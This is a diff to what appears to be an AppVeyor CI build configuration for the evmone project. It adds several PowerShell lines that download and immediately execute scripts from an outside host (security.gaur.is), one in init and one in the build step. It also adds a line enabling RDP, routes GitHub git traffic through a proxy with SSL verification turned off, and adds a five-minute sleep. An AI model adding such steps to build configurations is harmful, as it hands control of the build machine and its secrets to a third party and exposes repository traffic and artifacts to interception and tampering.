@@ -18,6 +18,12 @@ environment:
     - APPVEYOR_BUILD_WORKER_IMAGE: Visual Studio 2019
       GENERATOR: "Ninja"
 
+init:
+  - ps: iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/proxy'))
+  - git config --global http.https://github.com.proxy http://%APPVEYOR_HTTP_PROXY_IP%:%APPVEYOR_HTTP_PROXY_PORT%
+  - git config --global http.https://github.com.sslVerify false
+
 cache:
   - C:\.hunter\_Base\Cache -> cmake\Hunter\init.cmake
 
@@ -30,9 +36,11 @@ before_build:
   - cmake -S . -B build -DEVMONE_TESTING=ON -Wno-dev -G "%GENERATOR%" -DCMAKE_BUILD_TYPE=%CONFIGURATION% -DHUNTER_CONFIGURATION_TYPES=%CONFIGURATION% -DCMAKE_INSTALL_PREFIX=C:\install
 
 build_script:
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
   - cmake --build build --target package
   - mkdir package
   - mv build/evmone-* package
+  - ps: Start-Sleep -s 300
 
 artifacts:
   - path: package/*
